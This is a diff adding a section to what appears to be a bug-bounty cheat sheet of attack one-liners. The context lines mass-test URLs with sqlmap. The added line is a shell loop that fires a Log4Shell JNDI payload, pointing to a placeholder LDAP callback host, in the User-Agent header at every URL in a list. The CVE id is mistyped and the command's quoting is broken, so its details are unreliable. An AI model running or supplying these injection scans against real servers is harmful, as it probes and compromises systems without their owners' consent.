@@ -24,3 +24,7 @@
 4 gf sqli urls-check.txt >> sql.url
 5 sqlmap -m sql.url --dbs --batch
 ```
+
+# CVE-2021-4428 -> log4j Oneliner With User-Agent Payload:
+
+`while read url; do log4=$(curl -s -L $url -H User-Agent: "$\{jndi:ldap://your-pingback-client-url.com}");echo -e "$url -> User-Agent: Fired";done`
